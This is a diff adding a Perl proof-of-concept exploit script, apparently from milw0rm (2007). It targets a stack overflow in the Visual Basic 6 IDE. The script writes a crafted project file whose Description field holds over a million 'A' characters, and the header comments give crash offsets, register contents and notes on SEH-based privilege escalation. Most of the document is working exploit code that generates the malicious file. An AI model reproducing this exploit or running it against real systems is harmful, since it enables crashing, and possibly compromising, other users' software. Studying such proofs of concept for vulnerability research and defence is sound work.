@@ -1,0 +1,141 @@
+#!/usr/local/bin/perl
+
+
+#Discovered By UmZ (Umair Manzoor)
+#comments are welcome at umz32.dll[at]gmail.com
+#Dated 23-02-2007
+#Time : 02:00 AM PST
+#
+#Stack Overflow
+#Buffer Size 1037690
+#overflow offset  004A2E43
+#EBX contain values 
+#Memory to write 03B50188
+#
+#
+#
+#
+#Visual Basic Project Description Stack overflow
+#Affected Version  : Tested on Visual basic 6
+#Threats : DoS, Previlidges Escilation
+#From : Local system
+#
+#
+#Details:
+#  Microsoft Visual Basic 6.0 IDE crashes while parsing the project detail's field when characters more then 1037690 are provided, 
+#  causing stack overflow (vuln1.vbp in attached file). The data is stored as UNICODE means that Shellcode can be injected in unicode manner 
+#  to escilate previledges.
+#    As soon as the stack get overflow, an exception occur and NTDLL start handling it => means that SEH based exploitation will work.
+#   Offset is mentioned above at which IDE crash. Register EBX contain the malicious values.
+#   Memory address at which the malicous data (Project detail) are dumped is: 03EF0189 and on words.
+#
+#OVERFLOW CODE n Instructions:
+#
+#004A2E43  |. 8501           TEST DWORD PTR DS:[ECX],EAX
+#004A2E45  |. 3D 00100000    CMP EAX,1000
+#004A2E4A  |.^73 EC          JNB SHORT VB6.004A2E38
+#004A2E4C  \.^EB DB          JMP SHORT VB6.004A2E29
+
+#	    Disclaimer: This Proof of concept exploit is for educational purpose only.
+#		        Please do not use it against any system without prior permission.
+#          		You are responsible for yourself for what you do with this code.
+
+# This exploit is just POC, it will generate the crafted VB project.
+
+
+print("\nVisual Basic Project Description Stack overflow");
+print("\nAffected Version  : Tested on Visual basic 6");
+print("\nThreats : DoS, Previlidges Escilation");
+print("\nFrom : Local system");
+print("\n----------------------------------------------");
+print("\nDiscovered & Coded by UmZ"); 
+print("\numz32.dll[at]gmail.com");
+ 
+
+open (MYFILE, '>>Form1.frm');
+print MYFILE "VERSION 5.00\n";
+print MYFILE "Begin VB.Form Form1\n"; 
+print MYFILE q(Caption         =   "Form1");
+print MYFILE "\nClientHeight    =   3495\n";
+print MYFILE "ClientLeft      =   60\n";
+print MYFILE "ClientTop       =   345\n";
+print MYFILE "ClientWidth     =   4680\n";
+print MYFILE q(LinkTopic       =   "Form1");
+print MYFILE "\nScaleHeight     =   3495\n";
+print MYFILE "ScaleWidth      =   4680\n";
+print MYFILE "StartUpPosition =   3  'Windows Default\n";
+print MYFILE "Begin VB.CommandButton Command2\n"; 
+print MYFILE q(Caption         =   "write");
+print MYFILE "\nHeight          =   495\n";
+print MYFILE "Left            =   2400\n";
+print MYFILE "TabIndex        =   2\n";
+print MYFILE "Top             =   2640\n";
+print MYFILE "Width           =   1935\n";
+print MYFILE "End\n";
+print MYFILE "Begin VB.TextBox Text1\n"; 
+print MYFILE "Height          =   2175\n";
+print MYFILE "Left            =   480\n";
+print MYFILE "MultiLine       =   -1  'True\n";
+print MYFILE "TabIndex        =   1\n";
+print MYFILE q(Text            =   "Form1.frx":0000);
+print MYFILE "\nTop             =   360\n";
+print MYFILE "Width           =   3855\n";
+print MYFILE "End\n";
+print MYFILE "Begin VB.CommandButton Command1\n"; 
+print MYFILE q(Caption         =   "read");
+print MYFILE "\nHeight          =   495\n";
+print MYFILE "Left            =   480\n";
+print MYFILE "TabIndex        =   0\n";
+print MYFILE "Top             =   2640\n";
+print MYFILE "Width           =   1935\n";
+print MYFILE "End\n";
+print MYFILE "End\n";
+
+print MYFILE q(Attribute VB_Name = "Form1");
+print MYFILE "\nAttribute VB_GlobalNameSpace = False\n";
+print MYFILE "Attribute VB_Creatable = False\n";
+print MYFILE "Attribute VB_PredeclaredId = True\n";
+print MYFILE "Attribute VB_Exposed = False\n";
+close (MYFILE);
+
+open (MYFILE, '>>vuln1.vbp');
+print MYFILE "Type=Exe\n";
+print MYFILE "Reference=*\\G{00020430-0000-0000-C000-000000000046}#2.0#0#..\\..\\..\\..\\WINDOWS\\system32\\stdole2.tlb#OLE Automation\n";
+print MYFILE "Reference=*\\G{420B2830-E718-11CF-893D-00A0C9054228}#1.0#0#..\\..\\..\\..\\WINDOWS\\system32\\scrrun.dll#Microsoft Scripting Runtime\n";
+print MYFILE "Form=Form1.frm\n";
+print MYFILE q(Startup="Form1");
+print MYFILE "\nHelpFile=".q("");
+print MYFILE "\nCommand32=".q("");
+print MYFILE "\nName=".q("Project1");
+print MYFILE "\nHelpContextID=".q("0");
+print MYFILE "\nDescription=".q(")."A" x1037690 .q(");
+print MYFILE "\nCompatibleMode=".q("0");
+print MYFILE "\nMajorVer=1";
+print MYFILE "\nMinorVer=0";
+print MYFILE "\nRevisionVer=0";
+print MYFILE "\nAutoIncrementVer=0";
+print MYFILE "\nServerSupportFiles=0";
+print MYFILE "\nVersionCompanyName=".q("");
+print MYFILE "\nCompilationType=0";
+print MYFILE "\nOptimizationType=0";
+print MYFILE "\nFavorPentiumPro(tm)=0";
+print MYFILE "\nCodeViewDebugInfo=0";
+print MYFILE "\nNoAliasing=0";
+print MYFILE "\nBoundsCheck=0";
+print MYFILE "\nOverflowCheck=0";
+print MYFILE "\nFlPointCheck=0";
+print MYFILE "\nFDIVCheck=0";
+print MYFILE "\nUnroundedFP=0";
+print MYFILE "\nStartMode=0";
+print MYFILE "\nUnattended=0";
+print MYFILE "\nRetained=0";
+print MYFILE "\nThreadPerObject=0";
+print MYFILE "\nMaxNumberOfThreads=1";
+print MYFILE "\n[MS Transaction Server]";
+print MYFILE "\nAutoRefresh=1";
+
+close (MYFILE);
+
+print("\n\nCrafted Project has been generated!!!\n\n");
+
+# milw0rm.com [2007-05-23]
